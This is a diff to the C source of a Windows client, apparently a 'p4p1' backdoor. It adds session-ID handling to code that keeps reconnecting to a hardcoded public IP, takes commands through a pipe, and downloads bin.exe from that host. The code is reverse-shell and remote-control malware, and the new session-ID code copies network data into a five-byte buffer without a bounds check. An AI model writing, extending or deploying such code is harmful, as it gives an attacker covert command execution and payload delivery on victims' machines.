@@ -7,7 +7,7 @@ int main(int argc, char * argv[])
 
 	int portno;
 	char portchar[6];
-	FILE * fp = fopen("p4p1_port.cfg", "r");
+	FILE * fp = fopen("port.cfg", "r");
 	
 	if(fp == NULL){
 		portno = 4441;
@@ -24,6 +24,7 @@ int main(int argc, char * argv[])
 	}
 
 	while(1){
+		/* startup wsa*/
 		WSADATA wsa;
 		if(WSAStartup(MAKEWORD(2, 2), &wsa) != NO_ERROR){
 			fprintf(stderr, "Client : Error at wsastartup.\n");
@@ -38,30 +39,55 @@ int main(int argc, char * argv[])
 			return -1;
 		}
 
-		/*connect*/
-		int cn;
-		FILE *pPipe;
+		/* variables */
+		int cn;							//connect
+		FILE *pPipe;						//command pipe
 		int bytesSent;
 		int bytesRecv;
-		char buf[BUFSIZE] = "";
-		char prompt[10] = "\n<p4p1 /> ";
+		char sessionID[5];					// Session id given by serv
+		char buf[BUFSIZE] = "";					//buf
+		char prompt[10] = "\n<p4p1 /> ";			//prompt if no session id
 
 		bytesSent = 0;
 		bytesRecv = SOCKET_ERROR;
 	
-		struct sockaddr_in client;
+		struct sockaddr_in client;				//server information
 		client.sin_family = AF_INET;
-		client.sin_addr.s_addr = inet_addr(xstr(86.247.192.29));
 		client.sin_port = htons(portno);
+		if(LOCAL == 1){
+			client.sin_addr.s_addr = inet_addr(xstr(192.168.1.17));
+		} else {
+			client.sin_addr.s_addr = inet_addr(xstr(86.247.192.29));
+		}
+
 
 		/*pointers*/
 		int * pbs = &bytesSent;
 		int * pbr = &bytesRecv;
 
+		/* connect */
 		
 		do{
 			cn = connect(s, (SOCKADDR*) &client, sizeof(client));
 		} while( cn == SOCKET_ERROR);
+
+		/* receive session ID */
+
+		 *pbr = SOCKET_ERROR;
+
+                 while(*pbr == SOCKET_ERROR){
+                         *pbr = recv(s, buf, BUFSIZE, 0);
+                         if(*pbr == 0 || *pbr == WSAECONNRESET){
+                                break;
+                         }
+
+                        if(bytesRecv < 0){
+                             	return -1;
+                        } else {
+				strcpy(sessionID, buf);
+				memset(buf, 0, BUFSIZE);
+			}
+		}
 
 		while(cn != SOCKET_ERROR){
 			/*send & recv*/
@@ -88,7 +114,8 @@ int main(int argc, char * argv[])
 					return -1;
 				} else {
 					/*process received data*/
-					if(iscommand(buf[0]) == 1 || iscommand(buf[0]) == 2){
+					if(iscommand(buf[0]) == 1 || iscommand(buf[0]) == 2
+						|| iscommand(buf[0]) == 3){
 						if(iscommand(buf[0]) == 2){	// custom p4p1 commadn
 							memset(buf, 0, BUFSIZE);
 							goto close;
@@ -96,6 +123,10 @@ int main(int argc, char * argv[])
 							memset(buf, 0, BUFSIZE);
 							download();
 							strcpy(buf, "file downloaded from 86.247.192.29 / bin.exe\n");
+						} else if(iscommand(buf[0]) == 3){
+							memset(buf, 0, BUFSIZE);
+							strcpy(buf, "Session ID: ");
+							strcat(buf, sessionID);
 						} else {
 							memset(buf, 0, BUFSIZE);
 							strcpy(buf, "Command non recognized.\n");
